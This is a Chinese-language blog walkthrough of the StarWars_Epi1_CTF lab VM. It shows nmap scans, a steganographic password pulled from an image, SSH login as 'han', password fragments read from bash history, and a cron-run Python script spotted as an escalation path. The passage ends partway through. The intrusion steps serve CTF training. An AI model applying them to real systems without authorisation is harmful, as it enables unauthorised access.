

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="I3eg1nner">
  <meta name="keywords" content="">
  
    <meta name="description" content="StarWars_Epi1_CTF靶机信息收集12345678910┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.147Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-09-30 06:54 EDTNmap scan report for 192.168.56.147H">
<meta property="og:type" content="article">
<meta property="og:title" content="StarWars_Epi1_CTF靶机">
<meta property="og:url" content="https://i3eg1nner.github.io/2023/09/177299db5791.html">
<meta property="og:site_name" content="I3eg1nner&#39;s blog">
<meta property="og:description" content="StarWars_Epi1_CTF靶机信息收集12345678910┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.147Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-09-30 06:54 EDTNmap scan report for 192.168.56.147H">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/6e247c18ce83b5eac3dcd3e4c6f2cd44_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/7e286042c829ca4f958fc8bccb97572c_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/7c16a56d309e950450e02d6bd39333b3_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/ddaab0d8894d08e9144d7b821d73f792_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/aca54e539a1212415868caa60c696c8c_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/0cb12a73f62a1e4bc890bd7cc47fac45_MD5.png">
<meta property="og:image" content="https://i3eg1nner.github.io/pic/fe68030205a468a1bf3149444e76e84b_MD5.png">
<meta property="article:published_time" content="2023-09-30T11:08:47.000Z">
<meta property="article:modified_time" content="2023-10-08T11:24:20.703Z">
<meta property="article:author" content="I3eg1nner">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/6e247c18ce83b5eac3dcd3e4c6f2cd44_MD5.png">
  
  
  
  <title>StarWars_Epi1_CTF靶机 - I3eg1nner&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>I3eg1nner</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="StarWars_Epi1_CTF靶机"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-09-30 19:08" pubdate>
          2023年9月30日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          16k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          135 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">StarWars_Epi1_CTF靶机</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="StarWars-Epi1-CTF靶机"><a href="#StarWars-Epi1-CTF靶机" class="headerlink" title="StarWars_Epi1_CTF靶机"></a>StarWars_Epi1_CTF靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.147<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 06:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.147<br>Host is up (0.00044s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:83:80:40 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.147<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 06:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.147<br>Host is up (0.00040s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 4c:53:4d:b2:26:ee:a5:10:d4:be:99:84:2a:9a:aa:11 (RSA)<br>|   256 95:d7:a4:e0:74:63:4b:08:b0:a8:8c:dc:e1:f8:91:25 (ECDSA)<br>|_  256 1d:07:d1:3d:99:02:f0:04:ba:23:c3:a4:fd:0d:3d:91 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="hljs-string">MAC Address: 08:00:27:83:80:40 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.56.147                            <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 06:55 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.147<br>Host is up (0.00025s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.38 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /manual/: Potentially interesting folder</span><br><span class="hljs-string">MAC Address: 08:00:27:83:80:40 (Oracle VirtualBox virtual NIC)</span><br></code></pre></td></tr></table></figure>

<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>先看 <code>robots.txt</code></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Why does <span class="hljs-keyword">the</span> Jedi Order keep checking <span class="hljs-keyword">the</span> robots.txt <span class="hljs-built_in">file</span>.<br>Might take <span class="hljs-keyword">a</span> look <span class="hljs-keyword">at</span> /r2d2<br>He is <span class="hljs-keyword">the</span> real OG. <br></code></pre></td></tr></table></figure>

<p><img src="/pic/6e247c18ce83b5eac3dcd3e4c6f2cd44_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>文字比较乱，搜了一下第一行，没发现什么有价值的信息，或许也可能是作为字典，后续没别的思路了再尝试。</p>
<p><img src="/pic/7e286042c829ca4f958fc8bccb97572c_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>可能是用户名或者密码，记录下来，看看 wordpress 目录</p>
<p><img src="/pic/7c16a56d309e950450e02d6bd39333b3_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>wordpress 无收获，看看 admin 目录</p>
<p><img src="/pic/ddaab0d8894d08e9144d7b821d73f792_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>源码中没什么东西，而且登录验证的 php 文件不存在，没法爆破</p>
<p>网站根目录中是两张图片，一张 jpg，一张 png，网页源码中有一段编码后的字符串，试一试 base64 编码，得到一串二进制字符串，再试一试二进制解码，得到真正有意义的字符，但是却不是我们需要的</p>
<p><img src="/pic/aca54e539a1212415868caa60c696c8c_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>查看 images 目录</p>
<p><img src="/pic/0cb12a73f62a1e4bc890bd7cc47fac45_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>发现一个有意思的事情，png 图片明显比 jpg 图片大得多，猜测可能有隐写的信息</p>
<h2 id="png-图片隐写"><a href="#png-图片隐写" class="headerlink" title="png 图片隐写"></a>png 图片隐写</h2><p>使用 zsteg 工具进行测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/StarWars_Epi1_CTF]<br>└─$ zsteg yoda.png <br>b1,b,lsb,xy         .. file: OpenPGP Secret Key<br>b1,rgb,lsb,xy       .. text: <span class="hljs-string">&quot;the real password is babyYoda123&quot;</span><br>b2,r,msb,xy         .. text: <span class="hljs-string">&quot;@@PTAT@U&quot;</span><br>b2,bgr,msb,xy       .. text: <span class="hljs-string">&quot;Q@DEADET&quot;</span><br>b2,rgba,lsb,xy      .. text: <span class="hljs-string">&quot;C&#123;/&#x27;kk?&#x27;&quot;</span><br>b3,b,lsb,xy         .. text: <span class="hljs-string">&quot;!<span class="hljs-variable">$u86Kri4</span>&quot;</span><br>b4,r,msb,xy         .. text: <span class="hljs-string">&quot;A&amp;W#Ff&amp;b5!&quot;</span><br>b4,g,lsb,xy         .. text: <span class="hljs-string">&quot;DhTS6BTgd107R&#x27;Vc&quot;</span><br>b4,g,msb,xy         .. text: <span class="hljs-string">&quot;6%a0g!f&amp;b5!&quot;</span><br>b4,b,msb,xy         .. text: <span class="hljs-string">&quot;RdT% \&quot;FD1a&quot;</span><br>b4,rgb,lsb,xy       .. text: <span class="hljs-string">&quot;n,HnJJL&amp;&quot;</span><br>b4,rgb,msb,xy       .. text: <span class="hljs-string">&quot;CRfgvf&#x27;2\&quot;cvU4#&quot;</span><br>b4,bgr,lsb,xy       .. text: <span class="hljs-string">&quot;.hLNjJ,F&quot;</span><br>b4,bgr,msb,xy       .. text: <span class="hljs-string">&quot;VBgvfg6\&quot;#rfT%3&quot;</span><br>b4,rgba,lsb,xy      .. text: <span class="hljs-string">&quot;so/O@OPo.O&quot;</span><br>b4,abgr,msb,xy      .. text: <span class="hljs-string">&quot;S/7_&amp;?a_B&quot;</span><br></code></pre></td></tr></table></figure>

<p>得到了密码，而这个网站的登录界面是无法正常进行验证的，只能从 22 端口进行考虑。同时我们还收集到了 <code>han</code> 和 <code>skywalker</code> 两个字符串，猜测可能是用户名。</p>
<h2 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h2><p>接下来我手动尝试了 r2d2, root, skywalker 和 han，其中 han 登录成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/StarWars_Epi1_CTF]<br>└─$ ssh han@192.168.56.147<br>han@192.168.56.147\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux starwars 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Thu Jul 23 08:18:42 2020 from ::1</span><br><span class="hljs-string">han@starwars:~$ whoami</span><br><span class="hljs-string">han</span><br><span class="hljs-string">han@starwars:~$ id</span><br><span class="hljs-string">uid=1000(han) gid=1000(han) groups=1000(han)</span><br><span class="hljs-string">han@starwars:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:83:80:40 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.147/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3</span><br><span class="hljs-string">       valid_lft 334sec preferred_lft 334sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe83:8040/64 scope link noprefixroute </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">han@starwars:~$ uname -a</span><br><span class="hljs-string">Linux starwars 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="hljs-string">han@starwars:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for han: </span><br><span class="hljs-string">Sorry, user han may not run sudo on starwars.</span><br></code></pre></td></tr></table></figure>

<p>看看用户家目录是否有敏感文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:~$ <span class="hljs-built_in">ls</span> -alih<br>total 32K<br>  170 drwxr-xr-x 4 han  han  4.0K Jul 23  2020 .<br>  193 drwxr-xr-x 5 root root 4.0K Jul 23  2020 ..<br>43122 -rw------- 1 han  han   483 Jul 24  2020 .bash_history<br>38236 -rw-r--r-- 1 han  han   220 Apr 18  2019 .bash_logout<br> 1748 -rw-r--r-- 1 han  han  3.5K Apr 18  2019 .bashrc<br>42430 drwx------ 3 han  han  4.0K Jul 23  2020 .gnupg<br> 1261 -rw-r--r-- 1 han  han   807 Apr 18  2019 .profile<br>41082 drwxr-xr-x 2 han  han  4.0K Jul 24  2020 .secrets<br></code></pre></td></tr></table></figure>

<p>关注历史命令文件和 <code>.secrets</code> 文件夹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:~$ <span class="hljs-built_in">cat</span> .bash_history <br>sudo su<br><span class="hljs-built_in">ls</span> -al<br><span class="hljs-built_in">mkdir</span> .secrets <br><span class="hljs-built_in">ls</span> <br><span class="hljs-built_in">ls</span> -al<br><span class="hljs-built_in">cd</span> .secrets/<br><span class="hljs-built_in">ls</span> -al<br><span class="hljs-built_in">touch</span> firsthalf.txt <br><span class="hljs-built_in">touch</span> note.txt<br><span class="hljs-built_in">echo</span> first half of the password is: luke12 &gt;&gt; firsthalf.txt <br><span class="hljs-built_in">cat</span> firsthalf.txt <br><span class="hljs-built_in">echo</span> Darth knows everything &gt;&gt; note.txt <br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">cd</span> .secrets/<br><span class="hljs-built_in">cat</span>  firsthalf.txt <br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> .secrets/<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">rm</span> firsthalf.txt <br><span class="hljs-built_in">cat</span> note.txt <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;r2d2 thinks you&#x27;re a cewl kid, what about anakin?&quot;</span> &gt; note.txt <br><span class="hljs-built_in">cat</span> note.txt <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Anakin is a cewl kid.&quot;</span> &gt; note.txt <br><span class="hljs-built_in">cat</span> note.txt <br><span class="hljs-built_in">cd</span> ..<br>su Darth<br>sudo -l<br>su Darth<br><br>han@starwars:~$ <span class="hljs-built_in">cd</span> .secrets/<br>han@starwars:~/.secrets$ <span class="hljs-built_in">ls</span> -alih<br>total 12K<br>41082 drwxr-xr-x 2 han han 4.0K Jul 24  2020 .<br>  170 drwxr-xr-x 4 han han 4.0K Jul 23  2020 ..<br>43245 -rw-r----- 1 han han   22 Jul 24  2020 note.txt<br>han@starwars:~/.secrets$ <span class="hljs-built_in">cat</span> note.txt<br>Anakin is a cewl kid.<br><br></code></pre></td></tr></table></figure>

<p>拿到了前一半的密码，和 “Anakin is a cewl kid.” 的提示，接下来看看别的用户的家目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:~/.secrets$ <span class="hljs-built_in">cd</span> /home/Darth<br>han@starwars:/home/Darth$ <span class="hljs-built_in">ls</span> -alih<br>total 44K<br>43137 drwxr-xr-x 5 Darth Darth 4.0K Jul 24  2020 .<br>  193 drwxr-xr-x 5 root  root  4.0K Jul 23  2020 ..<br>43125 -rw------- 1 Darth Darth 2.3K Jul 24  2020 .bash_history<br>43304 -rw-r--r-- 1 Darth Darth  220 Apr 18  2019 .bash_logout<br>43303 -rw-r--r-- 1 Darth Darth 3.5K Apr 18  2019 .bashrc<br>43305 drwx------ 3 Darth Darth 4.0K Jul 23  2020 .gnupg<br> 1419 -rw------- 1 Darth Darth   42 Jul 24  2020 .lesshst<br> 1415 drwxr-xr-x 3 Darth Darth 4.0K Jul 24  2020 .<span class="hljs-built_in">local</span><br>43302 -rw-r--r-- 1 Darth Darth  807 Apr 18  2019 .profile<br> 1420 drwxr-xr-x 2 Darth Darth 4.0K Jul 24  2020 .secrets<br> 1414 -rw-r--r-- 1 Darth Darth   66 Jul 24  2020 .selected_editor<br>han@starwars:/home/Darth$ <span class="hljs-built_in">cd</span> .secrets/<br>han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">ls</span> -alih<br>total 12K<br> 1420 drwxr-xr-x 2 Darth Darth  4.0K Jul 24  2020 .<br>43137 drwxr-xr-x 5 Darth Darth  4.0K Jul 24  2020 ..<br> 1425 -rwxrw-r-- 1 Darth anakin  105 Jul 24  2020 evil.py<br>han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">cat</span> evil.py<br><span class="hljs-comment"># Let the fear flow through you every single minute</span><br><br>fear = 1<br>anger = fear<br>hate = anger<br>suffering = hate<br></code></pre></td></tr></table></figure>

<p>Darth 有个定时每分钟执行任务的脚本，或许可以被利用，但是这个文件只有 anakin 组的用户才能修改，我只能读取。上传个 pspy 来确认这个定时脚本是运行的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">2023/10/02 08:12:01 CMD: UID=0     PID=17682  | /usr/sbin/CRON -f <br>2023/10/02 08:12:01 CMD: UID=0     PID=17683  | /usr/sbin/CRON -f <br>2023/10/02 08:12:01 CMD: UID=1002  PID=17684  | /bin/sh -c python /home/Darth/.secrets/evil.py<br></code></pre></td></tr></table></figure>

<p>看看 skywalker 的家目录</p>
